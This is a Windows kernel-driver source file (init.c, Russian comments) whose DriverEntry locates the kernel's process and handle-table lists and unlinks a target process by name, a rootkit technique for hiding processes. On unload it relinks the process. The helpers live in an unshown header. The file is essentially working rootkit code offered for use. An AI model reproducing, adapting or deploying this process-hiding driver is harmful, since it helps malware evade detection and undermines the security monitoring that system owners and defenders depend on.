/****************************************************************************

    Модуль init.c

****************************************************************************/

#include <ntddk.h>
#include "process.h"

//*************************************************************
// константы



// глобальные переменные



extern SHORT *NtBuildNumber;



//*************************************************************
// предварительное объявление функций

NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath);
NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject);



//*************************************************************
// описание функций

// функция инициализации драйвера
NTSTATUS DriverEntry (IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath){
	UNREFERENCED_PARAMETER(RegistryPath);
	
	NTSTATUS status = STATUS_SUCCESS;

#if DBG
    DbgPrint("Load driver %wZ\n",&DriverObject->DriverName);
#endif

	DriverObject->DriverUnload = &DriverUnload;
	//DbgBreakPoint();
	switch(*NtBuildNumber){
		case WINXP_BUILD_NUMBER:
			INIT_OFFSETS_WINXP();
			break;
		case WIN7_BUILD_NUMBER:
			DbgPrint("Win7\n");
			INIT_OFFSETS_WIN7();
			break;
		case WIN8_BUILD_NUMBER:
			DbgPrint("Win8\n");
			INIT_OFFSETS_WIN8();
			break;
		default:
			return STATUS_UNSUCCESSFUL;
	}



    // получаем указатель на заголовок списка всех процессов
    PsActiveProcessHead = (GET_ENTRY_PROCESS_LIST(PsGetCurrentProcess()))->Blink;
	PsActiveHandleTableHead = (GET_HANDLE_TABLE_LIST_ENTRY(*(GET_HANDLE_TABLE(PsGetCurrentProcess()))))->Blink;

	DeleteFromProcessListByName(TARGET_NAME);
	//DeleteFromProcessListByPid(TARGET_PID);
    // выводим информацию о потоках всех процессов
    ShowAllProcess();
	//DbgPrint("%hu\n", *NtBuildNumber);
	

    return status;
}

NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject){
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrint("Driver unload\n");
	
	//DbgBreakPoint();
	InsertProcessEntry();
	
	return STATUS_SUCCESS;
} 



//-----------------------------------------------

